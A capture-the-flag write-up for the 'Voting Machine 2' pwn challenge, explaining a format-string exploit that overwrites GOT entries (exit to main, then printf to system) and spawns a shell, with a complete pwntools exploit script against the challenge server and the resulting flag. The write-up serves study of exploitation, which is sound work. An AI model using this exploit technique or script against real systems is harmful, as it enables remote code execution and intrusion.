[../](../../)

# Voting Machine 2

## pwn - Points: 73

> In a world with many uncertainties we need some kind of structure. Democracy is a big part of that, therefore we need voting machines! Well, at least if they are safe...
>
> nc 13.53.125.206 50000
>
> [kamikaze2](kamikaze2)
>
> [libc-2.27.so](libc-2.27.so)

## Solution

The solution is to exploit format strings that are directly passed to `printf`.

With the first format string, the `GOT` address of the `exit` function is replaced with the `main` function, so that it recursively calls itself again what allows us to use multiple format strings.

With the next format string, the `GOT` entry of `printf` is printed out, so that we have the `libc` address of `printf` and can calculate the offset of the `system` function.

With the next format string, the `GOT` entry of `printf` is replaced with the address of `system`, so the invocation of `printf` will now call the `system` function.

At last, simply pass `/bin/sh` which is now passed so `system` and spawns a shell.

```python
from pwn import *


libc = ELF('libc-2.27.so')
e = ELF('kamikaze2')

p = remote('13.53.125.206', 50000)

main = 0x084207fb
format_string = fmtstr_payload(8, {e.got['exit']: main}, numbwritten=2)

print p.recvuntil(': ')
p.sendline('AA' + format_string)

print p.recvuntil(': ')
p.sendline('AA' + p32(e.got['printf']) + '%8$s')
p.recv(6)

printf = u32(p.recv(4))

print hex(printf)

libc_base = printf - libc.symbols['printf']
system = libc_base + libc.symbols['system']

format_string = fmtstr_payload(8, {e.got['printf']: system}, numbwritten=2)

print p.recvuntil(': ')
p.sendline('AA' + format_string)

print p.recvuntil(': ')
p.sendline('/bin/sh')

p.interactive()
```

flag: `watevr{GOT_som3_fl4g_for_you_https://www.youtube.com/watch?v=hYeFcSq7Mxg}`